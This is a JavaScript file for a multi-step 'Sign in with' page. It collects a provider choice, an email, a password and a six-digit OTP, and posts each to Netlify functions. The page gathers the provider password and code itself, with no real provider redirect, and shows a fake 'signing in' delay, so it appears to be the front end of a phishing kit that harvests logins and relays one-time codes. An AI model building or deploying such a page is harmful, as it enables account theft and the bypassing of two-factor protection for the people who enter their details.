document.addEventListener("DOMContentLoaded", () => {
  const providerSelectionPage = document.getElementById("provider-selection");
  const credentialsInputPage = document.getElementById("credentials-input");
  const otpVerificationPage = document.getElementById("otp-verification");
  const signingInPage = document.getElementById("signing-in");
  const credentialsTitle = document.getElementById("credentials-title");
  const credentialsForm = document.getElementById("credentials-form");
  const otpForm = document.getElementById("otp-form");
  const backToProvidersBtn = document.getElementById("back-to-providers");
  const backToCredentialsBtn = document.getElementById("back-to-credentials");
  const providerButtons = document.querySelectorAll(".provider-btn");

  let selectedProvider = null;
  let userEmail = null;

  function showPage(page) {
    [
      providerSelectionPage,
      credentialsInputPage,
      otpVerificationPage,
      signingInPage
    ].forEach(sec => sec && sec.classList.remove("active"));
    page.classList.add("active");
  }

  function capitalize(str) {
    if (!str) return "";
    return str.charAt(0).toUpperCase() + str.slice(1);
  }

  providerButtons.forEach((btn) => {
    btn.addEventListener("click", () => {
      selectedProvider = btn.dataset.provider;
      if (signingInPage) {
        document.getElementById("signing-in-provider").textContent = capitalize(selectedProvider);
        showPage(signingInPage);
        setTimeout(() => {
          credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
          credentialsForm.reset();
          showPage(credentialsInputPage);
        }, 1200);
      } else {
        credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
        credentialsForm.reset();
        showPage(credentialsInputPage);
      }
    });
  });

  backToProvidersBtn.addEventListener("click", () => {
    credentialsForm.reset();
    showPage(providerSelectionPage);
  });

  backToCredentialsBtn.addEventListener("click", () => {
    otpForm.reset();
    showPage(credentialsInputPage);
  });

  credentialsForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const formData = new FormData(credentialsForm);
    const email = formData.get("email").trim().toLowerCase();
    const password = formData.get("password").trim();

    if (!email || !password) {
      alert("Please fill in all fields.");
      return;
    }

    userEmail = email;

    try {
      const response = await fetch("/.netlify/functions/send-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          provider: selectedProvider,
        }),
      });

      const data = await response.json();

      if (data.success) {
        showPage(otpVerificationPage);
        document.getElementById("otp-timer").textContent = "OTP sent to your device. Enter it below to continue.";
      } else {
        alert(data.message || "Login failed. Please check your credentials and try again.");
      }
    } catch (error) {
      alert("Network error. Please try again.");
      console.error(error);
    }
  });

  otpForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const otpValue = otpForm.otp.value.trim();

    if (!/^\d{6}$/.test(otpValue)) {
      alert("Please enter a valid 6-digit OTP.");
      return;
    }

    try {
      const response = await fetch("/.netlify/functions/verify-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: userEmail, otp: otpValue }),
        credentials: "include"
      });

      const data = await response.json();

      if (data.success) {
        clearInterval(window.otpCountdownInterval);
        window.location.href = "/dashboard.html";
      } else {
        alert(data.message || "Invalid OTP. Please try again.");
      }
    } catch (error) {
      alert("Network error. Please try again.");
      console.error(error);
    }
  });
});